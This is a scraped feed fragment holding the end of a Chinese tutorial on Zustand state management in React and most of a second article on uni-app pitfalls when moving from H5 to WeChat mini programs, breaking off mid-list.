            <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({ <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> })),
            <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> }),
        }),
        {
            <span class="hljs-attr">name</span>: <span class="hljs-string">'counter'</span>, <span class="hljs-comment">// 持久化存储的 key</span>
        }
    )
)
</code></pre>
<p><strong>代码解析：</strong></p>
<ul>
<li><code>set</code>: 这是 Zustand 提供的核心方法。你不需要像 Redux 那样 <code>dispatch</code> 一个对象，直接调用 <code>set</code> 即可更新状态。</li>
<li><code>persist</code>: 这是一个中间件（Middleware）。它自动将状态同步到 <code>localStorage</code>。当你刷新页面时，计数器的数值不会归零，而是从本地存储恢复。</li>
</ul>
<h2 data-id="heading-6">三、 进阶：处理复杂数据结构 (Array &amp; Object)</h2>
<p>现实世界的应用远比计数器复杂。看看 <code>todo.ts</code>，我们如何处理数组和对象更新。</p>
<h3 data-id="heading-7">1. 不可变更新 (Immutable Updates)</h3>
<p>虽然 Zustand 使用起来很简单，但它遵循 React 的不可变数据原则。在更新数组或对象时，我们不能直接 <code>push</code> 或修改属性，而是需要返回一个新的对象/数组。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// todo.ts - 添加待办事项</span>
<span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-comment">// 使用展开运算符 (...) 创建新数组</span>
    <span class="hljs-attr">todos</span>: [...state.<span class="hljs-property">todos</span>, {
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">text</span>: text.<span class="hljs-title function_">trim</span>(),
        <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>
    }]
})),
</code></pre>
<h3 data-id="heading-8">2. 映射与过滤</h3>
<p>对于更新列表中的某一项（如切换完成状态）或删除某一项，标准的数组方法 <code>map</code> 和 <code>filter</code> 是最佳拍档。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// todo.ts - 切换状态</span>
<span class="hljs-attr">toggleTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> 
        <span class="hljs-comment">// 找到目标 ID，复制原对象并覆盖 completed 属性</span>
        todo.<span class="hljs-property">id</span> === id ? { ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> } : todo
    )
})),

<span class="hljs-comment">// todo.ts - 删除</span>
<span class="hljs-attr">removeTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">id</span> !== id)
}))
</code></pre>
<p>这种写法既保持了数据的纯净性，又让 React 能够精确地感知到状态变化，从而触发必要的重渲染。</p>
<h2 data-id="heading-9">四、 架构模式：模块化与持久化</h2>
<p>在大型应用中，我们不应该将所有状态塞进一个巨大的 Store。Zustand 鼓励创建多个独立的 Store，按功能切分。</p>
<h3 data-id="heading-10">1. 领域驱动的 Store 切分</h3>
<p>在提供的代码中，你可以清晰地看到三个文件分别管理三个领域：</p>
<ul>
<li><strong><code>counter.ts</code></strong>: 基础计数逻辑（工具类状态）。</li>
<li><strong><code>todo.ts</code></strong>: 业务数据逻辑（列表、增删改查）。</li>
<li><strong><code>user.ts</code></strong>: 全局会话逻辑（登录、注销、用户信息）。</li>
</ul>
<p>这种结构类似于后端的微服务或数据库表设计，互不干扰，清晰明了。</p>
<h3 data-id="heading-11">2. 用户认证状态管理 (<code>user.ts</code>)</h3>
<p>用户登录状态是典型的“全局共享”数据。一旦登录，Header 组件需要显示头像，设置页需要显示资料，购物车需要校验权限。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// user.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = create&lt;<span class="hljs-title class_">UserState</span>&gt;()(
    <span class="hljs-title function_">persist</span>(
        <span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
            <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">user</span>) =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">user</span>: user }),
            <span class="hljs-attr">logout</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>}),
        }),
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'user'</span> }
    )
)
</code></pre>
<p>结合 <code>persist</code> 中间件，这实现了一个极简的“记住我”功能。用户关闭浏览器再打开，只要 <code>localStorage</code> 中有数据，<code>isLogin</code> 依然为 <code>true</code>。</p>
<h2 data-id="heading-12">五、 实战：在 React 组件中消费状态</h2>
<p>有了“银行”，组件如何“取钱”？<code>App.tsx</code> 展示了极简的消费方式。</p>
<h3 data-id="heading-13">1. Hooks 方式调用</h3>
<p>你不需要 HOC（高阶组件），不需要 <code>connect</code>，不需要 <code>&lt;Provider&gt;</code>。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// App.tsx</span>
<span class="hljs-keyword">import</span> { useCounterStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./store/counter'</span>
<span class="hljs-keyword">import</span> { useTodoStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./store/todo'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 就像使用 useState 一样自然</span>
  <span class="hljs-keyword">const</span> { count, increment, decrement, reset } = <span class="hljs-title function_">useCounterStore</span>();
  
  <span class="hljs-comment">// 获取 Todo 相关的状态和方法</span>
  <span class="hljs-keyword">const</span> { todos, addTodo, toggleTodo, removeTodo } = <span class="hljs-title function_">useTodoStore</span>();
  
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-14">2. 性能优化：按需选取 (Selectors)</h3>
<p>虽然在 <code>App.tsx</code> 中我们直接解构了整个 Store 的返回值，但在生产环境中，<strong>最佳实践是只选取你需要的状态</strong>。这能避免不必要的重渲染。</p>
<p>例如，如果一个组件只需要显示 <code>count</code>，而不需要 <code>increment</code> 方法：</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 推荐写法：只订阅 count 的变化</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">useCounterStore</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">count</span>);
</code></pre>
<p>如果 Store 中还有其他无关属性更新了，只要 <code>count</code> 没变，这个组件就不会重新渲染。这是 Zustand 高性能的关键所在。</p>
<h3 data-id="heading-15">3. UI 交互逻辑</h3>
<p><code>App.tsx</code> 展示了清晰的逻辑分层：</p>
<ol>
<li><strong>UI 层</strong>：<code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, List 渲染。</li>
<li><strong>本地状态层</strong>：<code>inputValue</code> (使用 <code>useState</code> 管理输入框的临时状态，因为这是 UI 细节，不需要放入全局 Store)。</li>
<li><strong>全局业务层</strong>：点击 Add 时，调用 <code>addTodo(inputValue)</code>。</li>
</ol>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 典型的 UI 触发 Action 流程</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAdd</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (inputValue.<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span>;
    <span class="hljs-title function_">addTodo</span>(inputValue.<span class="hljs-title function_">trim</span>()); <span class="hljs-comment">// 调用全局 Store 的方法</span>
    <span class="hljs-title function_">setInputValue</span>(<span class="hljs-string">''</span>);          <span class="hljs-comment">// 重置本地 UI 状态</span>
}
</code></pre>
<h2 data-id="heading-16">六、 总结与展望</h2>
<p>Zustand 以其极简的 API 设计和强大的功能（中间件、TypeScript 支持、DevTools）成为了 React 状态管理的新宠。</p>
<p><strong>回顾我们学到的：</strong></p>
<ol>
<li><strong>创建 (Create)</strong> : 使用 <code>create</code> 定义 Store，将数据和操作封装在一起。</li>
<li><strong>持久化 (Persist)</strong> : 利用中间件轻松实现数据本地存储。</li>
<li><strong>消费 (Use)</strong> : 在组件中通过 Hooks 轻松获取状态和方法。</li>
<li><strong>架构 (Structure)</strong> : 按领域拆分 Store，保持代码整洁。</li>
</ol>
<p>如果你的项目觉得 Context API 难以维护，又觉得 Redux 过于繁琐，那么 Zustand 无疑是最佳的中间路线。它真正做到了像“中央银行”一样，安全、高效、井井有条地管理着应用的数据资产。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？]]></title>    <link>https://juejin.cn/post/7602154088477130790</link>    <guid>https://juejin.cn/post/7602154088477130790</guid>    <pubDate>2026-02-03T04:32:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154088477130790" data-draft-id="7602252722373050419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？"/> <meta itemprop="keywords" content="微信小程序"/> <meta itemprop="datePublished" content="2026-02-03T04:32:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="念你那丝微笑"/> <meta itemprop="url" content="https://juejin.cn/user/3237378908756792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app开发，为什么 H5 正常、微信小程序频繁踩坑？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3237378908756792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    念你那丝微笑
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:32:14.000Z" title="Tue Feb 03 2026 04:32:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近用 uni-app 写了一个项目，本地用 H5 模式开发和调试时一切正常，页面、交互、数据更新都没有问题。
但当代码部署到 微信小程序 后，却陆续出现了一些诡异的问题：
有的逻辑在 H5 能跑，小程序却完全不生效；有的组件在 H5 表现正常，小程序却怎么调都不对。</p>
<p>一开始我以为是自己代码写得有问题，直到踩坑越来越多才发现——
H5 和微信小程序的差异，远比我最初想象的要大得多。</p>
<p>所以想写篇博客记录一下开发中遇到的坑以及是如何解决的</p>
<blockquote>
<p><strong>同一套 uni-app / Vue 代码，H5 跑得好好的，到了微信小程序却各种翻车。</strong></p>
<p>v-show 不生效、table 里 ref 调不到、输入框值怎么都回不去……</p>
<p>这些问题并不是偶发 bug，而是<strong>微信小程序底层架构与浏览器完全不同</strong>导致的必然结果。</p>
</blockquote>
<p>本文从实际场景出发，把我在实际开发中高频踩到的坑系统整理一遍，树立一下<strong>小程序思维</strong>。</p>
<hr/>
<h2 data-id="heading-1">一、核心结论先行</h2>
<p>一句话总结微信小程序的本质：</p>
<blockquote>
<p><strong>微信小程序 = 双线程 + setData + 自定义组件</strong></p>
</blockquote>
<p>而 H5 是：</p>
<blockquote>
<p><strong>浏览器 + DOM + 同步更新</strong></p>
</blockquote>
<p>你在开发中遇到的 80% 问题，都可以回到这条差异上来解释。</p>
<hr/>
<h2 data-id="heading-2">二、什么是「双线程模型」？</h2>
<h3 data-id="heading-3">1. H5（浏览器）的运行方式</h3>
<p>在浏览器中：</p>
<ul>
<li>JS 可以直接操作 DOM</li>
<li>数据变化 → 视图几乎同步更新</li>
<li><code>v-model</code>、<code>input.value</code> 都是“最终裁判”</li>
</ul>
<p>可以理解为：</p>
<pre><code class="hljs">JS 线程
  ↓
DOM
  ↓
页面立刻变化
</code></pre>
<p>这是一个<strong>单一运行环境</strong>。</p>
<hr/>
<h3 data-id="heading-4">2. 微信小程序的运行方式</h3>
<p>微信小程序为了安全性和可控性，<strong>彻底禁用了 DOM</strong>，改成了双线程架构：</p>
<pre><code class="hljs language-scss" lang="scss">┌──────────────┐
│  逻辑层 JS   │  ← 你的 Vue / JS 代码
└───────▲──────┘
        │ <span class="hljs-built_in">setData</span>(JSON)
┌───────▼──────┐
│  视图层 WXML │  ← 渲染、组件内部状态
└──────────────┘
</code></pre>
<p>特点：</p>
<ul>
<li>逻辑层和视图层<strong>完全隔离</strong></li>
<li>只能通过 <code>setData</code> 传 JSON 数据</li>
<li>所有 UI 更新都是<strong>异步的</strong></li>
</ul>
<p><strong>JS 不能直接改 UI，只能“请求”视图层更新。</strong></p>
<hr/>
<h2 data-id="heading-5">三、为什么「H5 能跑，小程序翻车」？</h2>
<p>下面这些你踩过的坑，其实都源于同一个原因。</p>
<hr/>
<h2 data-id="heading-6">四、v-show 在 th / td 不生效</h2>
<h3 data-id="heading-7">1. H5 中的认知</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;td v-show="show"&gt;库存&lt;/td&gt;
</code></pre>
<p>在浏览器里：</p>
<ul>
<li>本质是 <code>display: none</code></li>
<li>DOM 仍然存在</li>
<li>table 布局可以正确处理</li>
</ul>
<hr/>
<h3 data-id="heading-8">2. 小程序中为什么不行？</h3>
<p>原因有两个：</p>
<ol>
<li>
<p><strong>小程序没有真实的 table DOM</strong></p>
<ul>
<li><code>table / tr / td</code> 只是被编译成普通 view</li>
<li>表格布局是 uni-ui 模拟的</li>
</ul>
</li>
<li>
<p><strong>表格结构在视图层一次性计算</strong></p>
<ul>
<li><code>v-show</code> 只改逻辑层状态</li>
<li>列宽、行结构不会重新计算</li>
</ul>
</li>
</ol>
<p>结果就是：</p>
<blockquote>
<p>数据变了，但表格结构不重算</p>
</blockquote>
<h3 data-id="heading-9">✅ 正确做法</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;th v-if="showCol"&gt;库存&lt;/th&gt;
&lt;td v-if="showCol"&gt;{{ row.stock }}&lt;/td&gt;
</code></pre>
<p><strong>在 table 结构里：只用 <code>v-if</code>，不要用 <code>v-show</code>。</strong></p>
<hr/>
<h2 data-id="heading-10">五、table 点击事件里调用 ref 不生效</h2>
<h3 data-id="heading-11">1. 常见写法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>.<span class="hljs-title function_">open</span>()
}
</code></pre>
<p>H5：大多能跑</p>
<p>小程序：经常无效</p>
<hr/>
<h3 data-id="heading-12">2. 真正原因</h3>
<p>在小程序中，事件链路是：</p>
<pre><code class="hljs language-markdown" lang="markdown">点击 td（视图层）
↓
事件传到逻辑层
↓
你同步调用 ref
↓
popup 组件：
<span class="hljs-bullet">  -</span> 可能还没渲染
<span class="hljs-bullet">  -</span> 可能被 v-show 隐藏
</code></pre>
<p><strong>ref 在小程序中是异步可用的。</strong></p>
<hr/>
<h3 data-id="heading-13">✅ 正确用法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>?.<span class="hljs-title function_">open</span>()
  })
}
</code></pre>
<p>并且：</p>
<ul>
<li>popup 尽量用 <code>v-if</code></li>
<li>不要指望 ref 在同一个 tick 里可用</li>
</ul>
<h2 data-id="heading-14">其实 <code>$refs + $nextTick</code> 在微信小程序依然不生效的真实原因</h2>
<p>很多人在 H5 中已经形成了一个<strong>条件反射式写法</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">popupRef</span>?.<span class="hljs-title function_">open</span>()
  })
}
</code></pre>
<p>在 <strong>H5 / WebView</strong> 下，这种写法基本 100% 生效；
但在 <strong>微信小程序（包括 uni-app）中，这段代码依然可能完全不生效</strong>。</p>
<h2 data-id="heading-15">❌ 为什么有时候 <code>$nextTick + ref</code> 在小程序里也不可靠？</h2>
<p>核心原因只有一句话：</p>
<blockquote>
<p><strong><code>$nextTick</code> 只能保证 Vue 虚拟 DOM 更新完成，不能保证小程序组件实例已经 ready</strong>。</p>
</blockquote>
<p>在微信小程序中：</p>
<ul>
<li>组件是 <strong>自定义组件</strong>（不是 DOM）</li>
<li>渲染发生在 <strong>渲染层线程</strong></li>
<li>父组件逻辑运行在 <strong>逻辑层线程</strong></li>
<li>组件实例的创建、挂载、通信，都需要经过 <code>setData</code> 的异步桥接</li>
</ul>
<p>因此会出现以下真实现象：</p>





















<table><thead><tr><th>你以为</th><th>实际发生</th></tr></thead><tbody><tr><td><code>$nextTick</code> 后 ref 一定存在</td><td>ref 变量存在，但组件实例尚未 ready</td></tr><tr><td><code>this.$refs.popupRef.open()</code></td><td>调用时组件方法尚未注入</td></tr><tr><td>控制台不报错</td><td>UI 没任何反应</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-16">✅ 小程序中最稳定、推荐的做法：状态驱动 + emit 回传</h3>
<p><strong>不要用父组件主动“命令式”调用子组件方法</strong>，而是：</p>
<blockquote>
<p>👉 <strong>用状态控制子组件，用事件通知父组件</strong></p>
</blockquote>
<h4 data-id="heading-17">父组件</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;Popup
  :visible="popupVisible"
  @close="popupVisible = false"
/&gt;
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">popupVisible</span>: <span class="hljs-literal">false</span> }
},
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">openPopup</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">popupVisible</span> = <span class="hljs-literal">true</span>
  }
}
</code></pre>
<h4 data-id="heading-18">子组件</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-attr">props</span>: { <span class="hljs-attr">visible</span>: <span class="hljs-title class_">Boolean</span> },
<span class="hljs-attr">watch</span>: {
  <span class="hljs-title function_">visible</span>(<span class="hljs-params">val</span>) {
    val ? <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">open</span>() : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">close</span>()
  }
},
<span class="hljs-attr">methods</span>: {
  <span class="hljs-title function_">close</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">'close'</span>)
  }
}
</code></pre>
<h4 data-id="heading-19">🧠 一句话总结</h4>
<ul>
<li>H5：<strong>可以命令式（ref / 调方法）</strong></li>
<li>小程序：<strong>必须声明式（状态驱动）</strong>
v-show 在 th / td 不生效</li>
</ul>
<h2 data-id="heading-20">六、输入框值更新失败（uni-easyinput）</h2>
<h3 data-id="heading-21">1. 现象</h3>
<ul>
<li>H5：校验后值能回退</li>
<li>小程序：输入框仍显示非法值</li>
</ul>
<hr/>
<h3 data-id="heading-22">2. 根因</h3>
<p>在小程序中：</p>
<pre><code class="hljs">组件内部 value（视图层）
≠
v-model 绑定值（逻辑层）
</code></pre>
<p>如果组件不是“完全受控”：</p>
<ul>
<li>视图层内部状态优先</li>
<li>你 setData 只是建议</li>
</ul>
<hr/>
<h3 data-id="heading-23">✅ 正确组合</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;uni-easyinput
  v-model="row.qty"
  :controlled="true"
  @change="checkQty"
/&gt;
</code></pre>
<p>关键点：</p>
<ul>
<li>使用 <code>change</code> 而不是 <code>input</code></li>
<li>开启 <code>controlled</code></li>
</ul>
<hr/>
<h2 data-id="heading-24">七、input / change / blur 的正确选择</h2>

























<table><thead><tr><th>事件</th><th>建议</th><th>原因</th></tr></thead><tbody><tr><td>input</td><td>❌ 少用</td><td>频繁、不可控</td></tr><tr><td>change</td><td>✅ 推荐</td><td>停止输入后的业务节点</td></tr><tr><td>blur</td><td>⚠️ UI 用</td><td>只是焦点变化</td></tr></tbody></table>
<p><strong>业务校验一律优先用 <code>change</code>。</strong></p>
<hr/>
<h2 data-id="heading-25">八、ref、v-for、响应式的隐藏雷区</h2>
<h3 data-id="heading-26">1. ref + v-for</h3>
<ul>
<li>H5：ref 数组</li>
<li>小程序：可能只有最后一个</li>
</ul>
<p>👉 不要依赖 ref 操作列表项</p>
<hr/>
<h3 data-id="heading-27">2. 深层对象更新</h3>
<pre><code class="hljs language-js" lang="js">list[index].<span class="hljs-property">count</span> = <span class="hljs-number">1</span>
</code></pre>
<p>在小程序中不稳定，推荐：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span>
  item.<span class="hljs-property">id</span> === row.<span class="hljs-property">id</span> ? { ...item, <span class="hljs-attr">count</span>: <span class="hljs-number">1</span> } : item
)
<span class="hljs-comment">//或者</span>
<span class="hljs-keyword">const</span> index=<span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">find</span>(item.<span class="hljs-property">id</span>===row.<span class="hljs-property">id</span>)
<span class="hljs-variable language_">this</span>.$set(<span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index], <span class="hljs-string">'count'</span>, <span class="hljs-number">1</span>)
</code></pre>
<p><strong>不可变更新在小程序更安全。</strong></p>
<hr/>
<h2 data-id="heading-28">九、统一解释模型（记住这个）</h2>
<p>你遇到的所有问题，其实都是：</p>
<blockquote>
<p><strong>逻辑层变了，但视图层没有按你预期同步</strong></p>
</blockquote>
<p>对应关系：</p>





















<table><thead><tr><th>现象</th><th>根因</th></tr></thead><tbody><tr><td>v-show 不生效</td><td>视图结构不重算</td></tr><tr><td>ref 调不到</td><td>组件未 ready</td></tr><tr><td>input 回写失败</td><td>内部状态优先</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-29">十、小程序开发「安全原则」</h2>
<ol>
<li>少用 <code>input</code>，多用 <code>change</code></li>
<li>表格、弹窗优先 <code>v-if</code></li>
